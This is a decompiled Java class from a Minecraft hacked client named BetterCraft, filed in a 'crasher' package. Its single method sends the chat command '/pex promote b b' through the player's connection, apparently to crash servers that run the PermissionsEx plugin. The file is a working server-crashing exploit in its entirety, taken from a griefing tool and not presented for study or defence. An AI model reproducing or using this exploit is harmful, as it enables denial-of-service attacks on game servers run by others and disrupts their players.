/*   */ package me.nzxter.bettercraft.mods.crasher.pc;
/*   */ 
/*   */ import net.minecraft.client.Minecraft;
/*   */ import net.minecraft.network.Packet;
/*   */ import net.minecraft.network.play.client.CPacketChatMessage;
/*   */ 
/*   */ public class PermissionsExCrasher2 {
/*   */   public static void start() {
/* 9 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("/pex promote b b"));
/*   */   }
/*   */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\pc\PermissionsExCrasher2.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */